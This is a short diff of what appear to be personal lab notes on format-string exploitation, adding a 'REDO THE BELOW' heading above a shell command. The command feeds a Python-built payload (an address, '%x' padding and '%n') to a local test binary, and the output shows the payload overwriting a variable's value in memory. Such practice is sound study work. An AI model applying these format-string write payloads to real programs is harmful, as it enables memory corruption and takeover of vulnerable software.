@@ -243,6 +243,8 @@ var = 0x00000045 and is located at 0xffffdb5c
 
 
 
+### REDO THE BELOW
+
 vagrant@vagrant:~/scratch$ /home/vagrant/scratch/a.out $(python -c 'print "\x5c\xdb\xff\xff"+"%x"*5 + "%100x%n"')
 \▒ffffdd57f7ffcf1cf7fefe7a8f7fefe66                                                                                            f7ffd000
 var = 0x00000089 and is located at 0xffffdb5c
